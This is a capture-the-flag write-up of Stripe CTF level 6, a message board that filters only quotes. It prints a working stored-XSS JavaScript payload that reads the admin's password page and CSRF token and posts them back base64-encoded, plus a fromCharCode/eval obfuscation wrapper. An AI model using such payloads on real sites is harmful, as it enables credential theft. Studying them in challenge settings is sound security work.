Stripe CTF: Level #6
####################
:date: 2012-10-28 12:42
:author: useless
:category: Write-up
:slug: stripe-ctf-level-6
:status: published

.. image:: /images/stripe-ctf-level-6/level06-logo.jpg
    :alt: level06-logo.jpg
    :align: center

You can find the code for this level
`here </docs/stripe-ctf-level-6/stripe-ctf-level06.tar.gz>`__.

(sha256:
:code:`0fed78164db1eced67ff8eeba0998c81901880b293667f63f74e2838e63d2bf3`)

This level is a message board: you can share updates with your
friends. The only thing is, you can't put messages with quotes and
double quotes, in order to prevent SQL injection. You also can't change
your password, but don't worry, it's visible on your profile page. Can
we use this to retrieve the admin's password?

This level is a lot like level #4. When you post a message, the
server only checks for quotes and double quotes, not for script tags.
So, we can post a message consisting of javascript code which will
retrieve the password and post it on the board. But we can't use quotes
or double quotes: we'll have to obfuscate our code. And since the
admin's password contains quotes and double quotes, we'll have to
obfuscate it as well before we post it to the board. I chose to use
base64, and I found a javascript implementation
`here <http://www.webtoolkit.info/javascript-base64.html>`__.

.. code-block:: js

    function pwn_password()
    {
        var xml_password = null;
        xml_password = new XMLHttpRequest();

        xml_password.open("GET", "/user_info", false);
        xml_password.send(null);
        var password_page = xml_password.responseText;

        var csrf_token = document.new_post.elements['_csrf'].value;

        var params = "title=password&body=" +
        escape(Base64.encode(escape(password_page))) + "&_csrf=" +
        escape(csrf_token);

        var xml_post = null;
        xml_post = new XMLHttpRequest();

        xml_post.open("POST", "/posts", false);
        xml_post.setRequestHeader("Content-Type",
        "application/x-www-form-urlencoded");
        xml_post.setRequestHeader("Content-Length", params.length);
        xml_post.setRequestHeader("Connection", "keep-alive");
        xml_post.send(params);
    }

    window.onload = function() {
        pwn_password();
    }

We'll obfuscate it using String.fromCharCode (the following result
contains also the base64 function):

.. code-block:: html

    </script><script>eval(String.fromCharCode(47, 42, 42, 10, 42, 10, [...] 41, 59, 10, 125, 10));</script><script>
    <!-- The result is too big to be displayed entirely -->

Let's post this and wait for the admin to log in.

.. image:: /images/stripe-ctf-level-6/level06-form.png
    :alt: level06-form.png
    :align: center

Now, we check the source code, and we see some base64-encoded stuff.

.. image:: /images/stripe-ctf-level-6/level06-source.png
    :alt: level06-source.png
    :align: center

We just have to decode it.

.. image:: /images/stripe-ctf-level-6/level06-base64-decoded.png
    :alt: level06-base64-decoded.png
    :align: center

We URL decode it, to clean a little bit:

.. image:: /images/stripe-ctf-level-6/level06-w00t.png
    :alt: level06-w00t.png
    :align: center

w00t!

